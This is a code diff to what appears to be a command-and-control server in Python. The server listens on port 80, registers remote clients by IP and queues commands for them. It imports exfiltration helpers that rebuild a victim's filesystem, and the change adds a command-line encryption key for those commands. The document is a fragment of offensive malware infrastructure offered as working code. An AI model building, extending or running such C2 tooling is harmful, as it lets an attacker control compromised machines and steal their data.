@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import argparse
 import socketserver
 from threading import Thread
 from cli import Cli
@@ -10,6 +11,12 @@ import datetime
 from utils.encrypt import encrypt_decrypt
 from utils.exfiltrate import parse_exfiltrate_input,recreate_filesystem
 
+parser = argparse.ArgumentParser()
+
+parser.add_argument("-k", "--key", default=".*!")
+
+
+
 PORT=80
 
 class Server:
@@ -19,9 +26,13 @@ class Server:
     
     def __init__(self):
         self.server = socketserver.TCPServer(("0.0.0.0", PORT), CmdHttpHandler)
+        self.encryption_key = ".*!*!."
     
     def start(self):
         self.server.serve_forever()
+
+    def set_encryption_key(self, key: str):
+        self.encryption_key = key
 
     def register_subscriber(self, subscriber: ServerSubscriber):
         self.subscribers.append(subscriber)
@@ -36,7 +47,7 @@ class Server:
     
     def set_client_command(self, ip_or_friendly_name: str, cmd: str):
         client = self.get_client(ip_or_friendly_name)
-        client.set_cmd(cmd)
+        client.set_cmd(cmd, self.encryption_key)
     
     def register_client(self, ip: str) -> Client:
         client = Client(ip)
@@ -132,6 +143,7 @@ class CmdHttpHandler(socketserver.BaseRequestHandler):
 server = Server()
 
 def main():
+    args = parser.parse_args()
     print("""
     
 ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
@@ -145,7 +157,7 @@ def main():
     """)
     print("To print available commands enter 'HELP'")
     print()
-
+    server.set_encryption_key(args.key)
     cli = Cli(server)
     try:
         thread = Thread(target = cli.poll, daemon=True)
